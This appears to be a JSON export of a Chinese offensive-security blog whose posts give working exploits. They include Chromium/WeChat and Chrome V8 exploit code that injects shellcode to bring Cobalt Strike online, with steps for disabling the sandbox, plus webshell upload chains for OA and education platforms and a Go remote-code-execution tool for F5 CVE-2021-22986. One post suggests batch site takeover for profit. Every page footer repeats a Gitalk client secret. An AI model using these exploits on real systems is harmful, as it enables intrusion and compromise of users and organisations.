{"meta":{"title":"魔域魂窟","subtitle":"","description":"网络安全","author":"魂笛","url":"http://bo.vuvhz.top","root":"/"},"pages":[],"posts":[{"title":"微信3.2.11.151Google内核poc利用上线","slug":"微信3-2-11-151Google内核poc利用上线","date":"2021-09-17T13:08:11.000Z","updated":"2021-09-17T13:08:52.670Z","comments":true,"path":"2021/09/17/微信3-2-11-151Google内核poc利用上线/","link":"","permalink":"http://bo.vuvhz.top/2021/09/17/%E5%BE%AE%E4%BF%A13-2-11-151Google%E5%86%85%E6%A0%B8poc%E5%88%A9%E7%94%A8%E4%B8%8A%E7%BA%BF/","excerpt":"","text":"[转发]微信最新版本3.2.11.151 Google内核poc利用上线cs方式！微信对版本进行了紧急更新，但是忽略了小程序,依旧可执行shellcode!用的小程序上线的微信，最新版的 1&lt;web-view src&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt; &lt;&#x2F;web-view&gt; 测试页面进行上线测试 最新版本的微信 POC没变这里大佬是index.html 引用js代码： 1&lt;script src&#x3D;&quot;test.js&quot;&gt;&lt;&#x2F;script&gt; poc代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154ENABLE_LOG &#x3D; true;IN_WORKER &#x3D; true;&#x2F;&#x2F; run calc and hang in a loopvar shellcode &#x3D; [0x11,0x00,0x21];&#x2F;&#x2F;前面是例子shellcode替换成自己的 注意是x86的 生成C语言 shellcode 将\\换成“,0” 全部替换后删除首部“,”！function print(data) &#123;&#125;var not_optimised_out &#x3D; 0;var target_function &#x3D; (function (value) &#123; if (value &#x3D;&#x3D; 0xdecaf0) &#123; not_optimised_out +&#x3D; 1; &#125; not_optimised_out +&#x3D; 1; not_optimised_out |&#x3D; 0xff; not_optimised_out *&#x3D; 12;&#125;);for (var i &#x3D; 0; i &lt; 0x10000; ++i) &#123; target_function(i);&#125;var g_array;var tDerivedNCount &#x3D; 17 * 87481 - 8;var tDerivedNDepth &#x3D; 19 * 19;function cb(flag) &#123; if (flag &#x3D;&#x3D; true) &#123; return; &#125; g_array &#x3D; new Array(0); g_array[0] &#x3D; 0x1dbabe * 2; return &#39;c01db33f&#39;;&#125;function gc() &#123; for (var i &#x3D; 0; i &lt; 0x10000; ++i) &#123; new String(); &#125;&#125;function oobAccess() &#123; var this_ &#x3D; this; this.buffer &#x3D; null; this.buffer_view &#x3D; null; this.page_buffer &#x3D; null; this.page_view &#x3D; null; this.prevent_opt &#x3D; []; var kSlotOffset &#x3D; 0x1f; var kBackingStoreOffset &#x3D; 0xf; class LeakArrayBuffer extends ArrayBuffer &#123; constructor() &#123; super(0x1000); this.slot &#x3D; this; &#125; &#125; this.page_buffer &#x3D; new LeakArrayBuffer(); this.page_view &#x3D; new DataView(this.page_buffer); new RegExp(&#123; toString: function () &#123; return &#39;a&#39; &#125; &#125;); cb(true); class DerivedBase extends RegExp &#123; constructor() &#123; super( &#123; toString: cb &#125;, &#39;g&#39; ); this_.buffer &#x3D; new ArrayBuffer(0x80); g_array[8] &#x3D; this_.page_buffer; &#125; &#125; var derived_n &#x3D; eval(&#96;(function derived_n(i) &#123; if (i &#x3D;&#x3D; 0) &#123; return DerivedBase; &#125; class DerivedN extends derived_n(i-1) &#123; constructor() &#123; super(); return; $&#123;&quot;this.a&#x3D;0;&quot;.repeat(tDerivedNCount)&#125; &#125; &#125; return DerivedN; &#125;)&#96;); gc(); new (derived_n(tDerivedNDepth))(); this.buffer_view &#x3D; new DataView(this.buffer); this.leakPtr &#x3D; function (obj) &#123; this.page_buffer.slot &#x3D; obj; return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt); &#125; this.setPtr &#x3D; function (addr) &#123; this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt); &#125; this.read32 &#x3D; function (addr) &#123; this.setPtr(addr); return this.page_view.getUint32(0, true, ...this.prevent_opt); &#125; this.write32 &#x3D; function (addr, value) &#123; this.setPtr(addr); this.page_view.setUint32(0, value, true, ...this.prevent_opt); &#125; this.write8 &#x3D; function (addr, value) &#123; this.setPtr(addr); this.page_view.setUint8(0, value, ...this.prevent_opt); &#125; this.setBytes &#x3D; function (addr, content) &#123; for (var i &#x3D; 0; i &lt; content.length; i++) &#123; this.write8(addr + i, content[i]); &#125; &#125; return this;&#125;function trigger() &#123; var oob &#x3D; oobAccess(); var func_ptr &#x3D; oob.leakPtr(target_function); print(&#39;[*] target_function at 0x&#39; + func_ptr.toString(16)); var kCodeInsOffset &#x3D; 0x1b; var code_addr &#x3D; oob.read32(func_ptr + kCodeInsOffset); print(&#39;[*] code_addr at 0x&#39; + code_addr.toString(16)); oob.setBytes(code_addr, shellcode); target_function(0);&#125;try&#123; print(&quot;start running&quot;); trigger();&#125;catch(e)&#123; print(e);&#125; 仅用于学习，请不要用于违法犯罪！！！！ var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"cs批量爆破","slug":"cs批量爆破","date":"2021-09-17T13:04:28.000Z","updated":"2021-09-17T13:05:28.274Z","comments":true,"path":"2021/09/17/cs批量爆破/","link":"","permalink":"http://bo.vuvhz.top/2021/09/17/cs%E6%89%B9%E9%87%8F%E7%88%86%E7%A0%B4/","excerpt":"","text":"cs密码批量爆破显ip显示的更清楚 链接：https://pan.baidu.com/s/1Ht_SCsTIeZM7w-GS8hrhkQ提取码：1234复制这段内容后打开百度网盘手机App，操作更方便哦 之前改的大佬的没有显示ip，然后把ip显示了出来，就不用一个一个去找ip了，结合了单ip破解和多ip破解，ip.txt放ip，pass.txt放密码，结合fofa语句 var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"google-0day","slug":"google-0day","date":"2021-04-19T08:38:46.000Z","updated":"2021-04-19T08:42:48.619Z","comments":true,"path":"2021/04/19/google-0day/","link":"","permalink":"http://bo.vuvhz.top/2021/04/19/google-0day/","excerpt":"","text":"Cobalt Strike 利用 Chrome 0day 上线c x64POC (弹记事本的): 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&lt;script&gt; function gc() &#123; for (var i &#x3D; 0; i &lt; 0x80000; ++i) &#123; var a &#x3D; new ArrayBuffer(); &#125; &#125; let shellcode &#x3D; [0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00]; var wasmCode &#x3D; new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]); var wasmModule &#x3D; new WebAssembly.Module(wasmCode); var wasmInstance &#x3D; new WebAssembly.Instance(wasmModule); var main &#x3D; wasmInstance.exports.main; var bf &#x3D; new ArrayBuffer(8); var bfView &#x3D; new DataView(bf); function fLow(f) &#123; bfView.setFloat64(0, f, true); return (bfView.getUint32(0, true)); &#125; function fHi(f) &#123; bfView.setFloat64(0, f, true); return (bfView.getUint32(4, true)) &#125; function i2f(low, hi) &#123; bfView.setUint32(0, low, true); bfView.setUint32(4, hi, true); return bfView.getFloat64(0, true); &#125; function f2big(f) &#123; bfView.setFloat64(0, f, true); return bfView.getBigUint64(0, true); &#125; function big2f(b) &#123; bfView.setBigUint64(0, b, true); return bfView.getFloat64(0, true); &#125; class LeakArrayBuffer extends ArrayBuffer &#123; constructor(size) &#123; super(size); this.slot &#x3D; 0xb33f; &#125; &#125; function foo(a) &#123; let x &#x3D; -1; if (a) x &#x3D; 0xFFFFFFFF; var arr &#x3D; new Array(Math.sign(0 - Math.max(0, x, -1))); arr.shift(); let local_arr &#x3D; Array(2); local_arr[0] &#x3D; 5.1;&#x2F;&#x2F;4014666666666666 let buff &#x3D; new LeakArrayBuffer(0x1000);&#x2F;&#x2F;byteLength idx&#x3D;8 arr[0] &#x3D; 0x1122; return [arr, local_arr, buff]; &#125; for (var i &#x3D; 0; i &lt; 0x10000; ++i) foo(false); gc(); gc(); [corrput_arr, rwarr, corrupt_buff] &#x3D; foo(true); corrput_arr[12] &#x3D; 0x22444; delete corrput_arr; function setbackingStore(hi, low) &#123; rwarr[4] &#x3D; i2f(fLow(rwarr[4]), hi); rwarr[5] &#x3D; i2f(low, fHi(rwarr[5])); &#125; function leakObjLow(o) &#123; corrupt_buff.slot &#x3D; o; return (fLow(rwarr[9]) - 1); &#125; let corrupt_view &#x3D; new DataView(corrupt_buff); let corrupt_buffer_ptr_low &#x3D; leakObjLow(corrupt_buff); let idx0Addr &#x3D; corrupt_buffer_ptr_low - 0x10; let baseAddr &#x3D; (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000; let delta &#x3D; baseAddr + 0x1c - idx0Addr; if ((delta % 8) &#x3D;&#x3D; 0) &#123; let baseIdx &#x3D; delta &#x2F; 8; this.base &#x3D; fLow(rwarr[baseIdx]); &#125; else &#123; let baseIdx &#x3D; ((delta - (delta % 8)) &#x2F; 8); this.base &#x3D; fHi(rwarr[baseIdx]); &#125; let wasmInsAddr &#x3D; leakObjLow(wasmInstance); setbackingStore(wasmInsAddr, this.base); let code_entry &#x3D; corrupt_view.getFloat64(13 * 8, true); setbackingStore(fLow(code_entry), fHi(code_entry)); for (let i &#x3D; 0; i &lt; shellcode.length; i++) &#123; corrupt_view.setUint8(i, shellcode[i]); &#125; main();&lt;&#x2F;script&gt; CS开启监听 监听器随意，https的稳定 生成payload 记得勾选64位 获得C的payload 类似这样 取出 shellcode 部分 全局替换 \\ 为 ,0 然后取出来shellcode 放入 chrome 0day 中 替换后 复制出来 放入文章开头的 POC 中 第7行 给shellcode 赋值数组 保存 成 msf.html chrome 浏览器 创建快捷方式到桌面 右键编辑快捷方式 增加 -no-sandbox 参数 关闭沙箱 在chrome浏览器打开 msf.html ， CS 上线！ payload c#weijs 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167ENABLE_LOG &#x3D; true;IN_WORKER &#x3D; true;&#x2F;&#x2F; run calc and hang in a loopvar shellcode &#x3D; [#shellcode];&#x2F;&#x2F;shellcode替换成自己的 注意是x86的c#function print(data) &#123;&#125;var not_optimised_out &#x3D; 0;var target_function &#x3D; (function (value) &#123; if (value &#x3D;&#x3D; 0xdecaf0) &#123; not_optimised_out +&#x3D; 1; &#125; not_optimised_out +&#x3D; 1; not_optimised_out |&#x3D; 0xff; not_optimised_out *&#x3D; 12;&#125;);for (var i &#x3D; 0; i &lt; 0x10000; ++i) &#123; target_function(i);&#125;var g_array;var tDerivedNCount &#x3D; 17 * 87481 - 8;var tDerivedNDepth &#x3D; 19 * 19;function cb(flag) &#123; if (flag &#x3D;&#x3D; true) &#123; return; &#125; g_array &#x3D; new Array(0); g_array[0] &#x3D; 0x1dbabe * 2; return &#39;c01db33f&#39;;&#125;function gc() &#123; for (var i &#x3D; 0; i &lt; 0x10000; ++i) &#123; new String(); &#125;&#125;function oobAccess() &#123; var this_ &#x3D; this; this.buffer &#x3D; null; this.buffer_view &#x3D; null; this.page_buffer &#x3D; null; this.page_view &#x3D; null; this.prevent_opt &#x3D; []; var kSlotOffset &#x3D; 0x1f; var kBackingStoreOffset &#x3D; 0xf; class LeakArrayBuffer extends ArrayBuffer &#123; constructor() &#123; super(0x1000); this.slot &#x3D; this; &#125; &#125; this.page_buffer &#x3D; new LeakArrayBuffer(); this.page_view &#x3D; new DataView(this.page_buffer); new RegExp(&#123; toString: function () &#123; return &#39;a&#39; &#125; &#125;); cb(true); class DerivedBase extends RegExp &#123; constructor() &#123; &#x2F;&#x2F; var array &#x3D; null; super( &#x2F;&#x2F; at this point, the 4-byte allocation for the JSRegExp &#96;this&#96; object &#x2F;&#x2F; has just happened. &#123; toString: cb &#125;, &#39;g&#39; &#x2F;&#x2F; now the runtime JSRegExp constructor is called, corrupting the &#x2F;&#x2F; JSArray. ); &#x2F;&#x2F; this allocation will now directly follow the FixedArray allocation &#x2F;&#x2F; made for &#96;this.data&#96;, which is where &#96;array.elements&#96; points to. this_.buffer &#x3D; new ArrayBuffer(0x80); g_array[8] &#x3D; this_.page_buffer; &#125; &#125; &#x2F;&#x2F; try&#123; var derived_n &#x3D; eval(&#96;(function derived_n(i) &#123; if (i &#x3D;&#x3D; 0) &#123; return DerivedBase; &#125; class DerivedN extends derived_n(i-1) &#123; constructor() &#123; super(); return; $&#123;&quot;this.a&#x3D;0;&quot;.repeat(tDerivedNCount)&#125; &#125; &#125; return DerivedN; &#125;)&#96;); gc(); new (derived_n(tDerivedNDepth))(); this.buffer_view &#x3D; new DataView(this.buffer); this.leakPtr &#x3D; function (obj) &#123; this.page_buffer.slot &#x3D; obj; return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt); &#125; this.setPtr &#x3D; function (addr) &#123; this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt); &#125; this.read32 &#x3D; function (addr) &#123; this.setPtr(addr); return this.page_view.getUint32(0, true, ...this.prevent_opt); &#125; this.write32 &#x3D; function (addr, value) &#123; this.setPtr(addr); this.page_view.setUint32(0, value, true, ...this.prevent_opt); &#125; this.write8 &#x3D; function (addr, value) &#123; this.setPtr(addr); this.page_view.setUint8(0, value, ...this.prevent_opt); &#125; this.setBytes &#x3D; function (addr, content) &#123; for (var i &#x3D; 0; i &lt; content.length; i++) &#123; this.write8(addr + i, content[i]); &#125; &#125; return this;&#125;function trigger() &#123; var oob &#x3D; oobAccess(); var func_ptr &#x3D; oob.leakPtr(target_function); print(&#39;[*] target_function at 0x&#39; + func_ptr.toString(16)); var kCodeInsOffset &#x3D; 0x1b; var code_addr &#x3D; oob.read32(func_ptr + kCodeInsOffset); print(&#39;[*] code_addr at 0x&#39; + code_addr.toString(16)); oob.setBytes(code_addr, shellcode); target_function(0);&#125;try&#123; print(&quot;start running&quot;); trigger();&#125;catch(e)&#123; print(e);&#125; var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"金和协同水平越权漏洞","slug":"金和协同水平越权漏洞","date":"2021-04-04T03:43:29.000Z","updated":"2021-04-04T03:59:22.311Z","comments":true,"path":"2021/04/04/金和协同水平越权漏洞/","link":"","permalink":"http://bo.vuvhz.top/2021/04/04/%E9%87%91%E5%92%8C%E5%8D%8F%E5%90%8C%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"0day 3.28 金和协同管理OA平台. 水平越权漏洞此洞是由 goddmeon 师傅挖掘并授权发表。 在此感谢 goddmeon 师傅。 FoFA语法： body=”金和协同管理平台” &amp;&amp; country=”CN” 默认口令 admin / 000000 后台登录水平越权 C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&amp;UserID=想要的id用户 这个id指的是用户编号 登录，用过用户管理，看到用户编号0001为董事长 这是admin管理员权限登录的界面 为了验证水平越权漏洞，我们登录一个普通用户账号，下面是普通用户登录后的界面。 访问url: 12http:&#x2F;&#x2F;www.xxxxxxx.net&#x2F;C6&#x2F;JHSoft.Web.Dossier&#x2F;DossierBaseInfoView.aspx?CollID&#x3D;1&amp;UserID&#x3D;0001 var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"智慧教育越权","slug":"智慧教育越权","date":"2021-04-04T03:32:18.000Z","updated":"2021-04-04T03:33:37.215Z","comments":true,"path":"2021/04/04/智慧教育越权/","link":"","permalink":"http://bo.vuvhz.top/2021/04/04/%E6%99%BA%E6%85%A7%E6%95%99%E8%82%B2%E8%B6%8A%E6%9D%83/","excerpt":"","text":"智慧教育平台越权上传漏洞通杀拿webshell 1.fofa语法： 1&#x2F;Widget&#x2F;common&#x2F;Service&#x2F;CommonWidgetService.asmx&#x2F;Categorylist 2.漏洞越权位置 1&#x2F;SmartMobile&#x2F;MobileIndex.aspx?uname&#x3D;admin&amp;orgId&#x3D;0 有的会提示输入账号密码，直接访问这个注册，就可以注册 1Module&#x2F;SSO&#x2F;SJS_Register.aspx 可以登录个人后台， 3.登录后可以重普通用户越权到admin管理员用户 4.在个人页面抓包可以发现以get方式传输 试试有没有注入或者越权就加个?id=123 ?user=miko没有注入。。。。 当把user换成admin时 既然到了admin里面，这里应该有admin的cookie吧，于是直接又登录之前的越权漏洞地址，应该能到管理员后台 5.成功了 6.找上传点改filetype标签不行，加了个aspx，改了个aspx，还是不行，于是直接抓包，掏出burp 7.传不了，图片可以传，但是aspx传的时候进度条不动，。。。。卡住了，于是做图片马aspx加图片，哦呦，进去了，但是访问后报错 于是找大佬问问，大佬也试了一下，大佬用的asp加图片，于是我也改asp加图片嘿嘿 8.成功拿下webshell 目前发现这套模板可以写个批量拿站脚本，日收益会很不错，有些这个模板已经修复了，但是查找的高达90%都有这些漏洞。 漏洞复现 | （通用0day）好视通视频会议平台存在任意文件下载漏洞 https://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&amp;mid=2247484986&amp;idx=1&amp;sn=55c43e01fb9cce6962272045c263fd83&amp;chksm=c07fbdcef70834d8869f57ebd926e4237fb4379b317ac7aaa271a68c20ce99a5b054c283c7df&amp;mpshare=1&amp;scene=23&amp;srcid=0404byavRK4wQ0q01VcNxxQ5&amp;sharer_sharetime=1617496800125&amp;sharer_shareid=f18a0e6ff07a610f239caab878f64be5#rd var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"通达OA_v11.7文件上传","slug":"通达OA","date":"2021-03-23T13:38:16.000Z","updated":"2021-03-23T13:39:10.659Z","comments":true,"path":"2021/03/23/通达OA/","link":"","permalink":"http://bo.vuvhz.top/2021/03/23/%E9%80%9A%E8%BE%BEOA/","excerpt":"","text":"通达OA_v11.7 文件上传+文件包含 通达OA_v11.7 文件上传+文件包含1.任意用户登录 12&#x2F;mobile&#x2F;auth_mobi.php?isAvatar&#x3D;1&amp;uid&#x3D;1&amp;P_VER&#x3D;0 2.文件上传(后台) 123456789101112131415161718POST &#x2F;general&#x2F;reportshop&#x2F;utils&#x2F;upload.php?action&#x3D;upload&amp;newid&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;general&#x2F;reportshop&#x2F;workshop&#x2F;report&#x2F;attachment-remark&#x2F; HTTP&#x2F;1.1Host: 192.168.238.141Content-Length: 197Cache-Control: no-cacheUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.132 Safari&#x2F;537.36Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryk6YsCa9EZHcaYYulAccept: *&#x2F;*Accept-Encoding: gzip, deflateCookie:PHPSESSID&#x3D;e30i0923fb8vol34kldc0sqhn7Accept-Language: zh-CN,zh;q&#x3D;0.9,zh-HK;q&#x3D;0.8,ja;q&#x3D;0.7,en;q&#x3D;0.6,zh-TW;q&#x3D;0.5Connection: close------WebKitFormBoundaryk6YsCa9EZHcaYYulContent-Disposition: form-data; name&#x3D;&quot;FILE1&quot;; filename&#x3D;&quot;ceshi.txt&quot;Content-Type: text&#x2F;plainhello world------WebKitFormBoundaryk6YsCa9EZHcaYYul-- 3.文件包含(后台) 12&#x2F;ispirit&#x2F;interface&#x2F;gateway.php?json&#x3D;&#123;&#125;&amp;url&#x3D;general&#x2F;reportshop&#x2F;workshop&#x2F;report&#x2F;attachment-remark&#x2F;&#125;_ceshi.txt 利用链已在工具中更新 相对于redis那条利用链, 可优先使用它 和其他版本一样, 获取cookie后点击”后台getshell”即可(会自动识别v11.7版本的) 圈子专版 链接：https://pan.baidu.com/s/1VIuJ-5dZ0ENtpvUTfI-Vmw提取码：rjhd GitHub项目地址https://github.com/xinyu2428/TDOA_RCE var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"CVE-2021-22986复现","slug":"CVE-2021-22986","date":"2021-03-23T13:34:37.000Z","updated":"2021-03-23T13:35:31.819Z","comments":true,"path":"2021/03/23/CVE-2021-22986/","link":"","permalink":"http://bo.vuvhz.top/2021/03/23/CVE-2021-22986/","excerpt":"","text":"CVE-2021-22986 复现数据包如下: 1234567891011POST &#x2F;mgmt&#x2F;tm&#x2F;util&#x2F;bash HTTP&#x2F;1.1Host: User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:86.0)Accept: *&#x2F;*Connection: closeAuthorization: Basic YWRtaW46X-F5-Auth-Token: Content-Length: 46Content-Type: application&#x2F;json&#123;&quot;command&quot;: &quot;run&quot;, &quot;utilCmdArgs&quot;: &quot;-c id&quot;&#125; 工具使用 go 简单写一下，代码有点 low 下载地址：https://github.com/yuyan-sec/Poc-Project/tree/main/F5相关代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778package mainimport ( &quot;fmt&quot; &quot;net&#x2F;http&quot; &quot;io&#x2F;ioutil&quot; &quot;crypto&#x2F;tls&quot; &quot;time&quot; &quot;bytes&quot; &quot;regexp&quot; &quot;strings&quot; &quot;flag&quot;)func main()&#123; var host,cmd string flag.StringVar(&amp;host,&quot;u&quot;,&quot;&quot;,&quot;URL: http:&#x2F;&#x2F;127.0.0.1&quot;) flag.StringVar(&amp;cmd,&quot;c&quot;,&quot;&quot;,&quot;CMD: id&quot;) flag.Parse() if host &#x3D;&#x3D; &quot;&quot; || cmd &#x3D;&#x3D; &quot;&quot;&#123; fmt.Println(&#96;███████╗███████╗ ██████╗ ██████╗███████╗██╔════╝██╔════╝ ██╔══██╗██╔════╝██╔════╝█████╗ ███████╗ ██████╔╝██║ █████╗ ██╔══╝ ╚════██║ ██╔══██╗██║ ██╔══╝ ██║ ███████║ ██║ ██║╚██████╗███████╗╚═╝ ╚══════╝ ╚═╝ ╚═╝ ╚═════╝╚══════╝ CVE-2021-22986 Author: @yuyan-sec&#96;) &#125;else&#123; exp(host,cmd) &#125;&#125;func exp(url, cmd string)&#123; t :&#x3D; &amp;http.Transport&#123; TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: true&#125;, &#125; c :&#x3D; &amp;http.Client&#123; Transport: t, Timeout: 5 * time.Second, &#125; url &#x3D; strings.TrimRight(url,&quot;&#x2F;&quot;) url &#x3D; url + &quot;&#x2F;mgmt&#x2F;tm&#x2F;util&#x2F;bash&quot; payload :&#x3D; []byte(&quot;&#123;\\&quot;command\\&quot;: \\&quot;run\\&quot;, \\&quot;utilCmdArgs\\&quot;: \\&quot;-c &quot;+ cmd +&quot;\\&quot;&#125;&quot;) r, err :&#x3D; http.NewRequest(&quot;POST&quot;, url, bytes.NewBuffer(payload)) r.Header.Set(&quot;Content-Type&quot;, &quot;application&#x2F;json&quot;) r.Header.Set(&quot;X-F5-Auth-Token&quot;, &quot;&quot;) r.Header.Set(&quot;Authorization&quot;, &quot;Basic YWRtaW46&quot;) resp, err :&#x3D; c.Do(r) if err !&#x3D; nil&#123; return &#125; defer resp.Body.Close() body, err :&#x3D; ioutil.ReadAll(resp.Body) if err !&#x3D; nil&#123; return &#125; if resp.StatusCode &#x3D;&#x3D; 200&#123; reg :&#x3D; regexp.MustCompile(&#96;&quot;commandResult&quot;:&quot;(.*?)\\\\n&#96;) commandResult :&#x3D; reg.FindAllStringSubmatch(string(body),-1) result :&#x3D; commandResult[0][1] result &#x3D; strings.Replace(result,&quot;context&#x3D;system_u:system_r:initrc_t:s0&quot;,&quot;&quot;,-1) fmt.Println(result) &#125;else&#123; fmt.Println(&quot;fail&quot;) &#125;&#125; [转]@yuyan大佬 var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"MessageSolution邮件bug","slug":"MessageSolution","date":"2021-03-23T13:31:20.000Z","updated":"2021-03-23T13:32:43.615Z","comments":true,"path":"2021/03/23/MessageSolution/","link":"","permalink":"http://bo.vuvhz.top/2021/03/23/MessageSolution/","excerpt":"","text":"MessageSolution邮件归档系统EEA 信息泄露漏洞 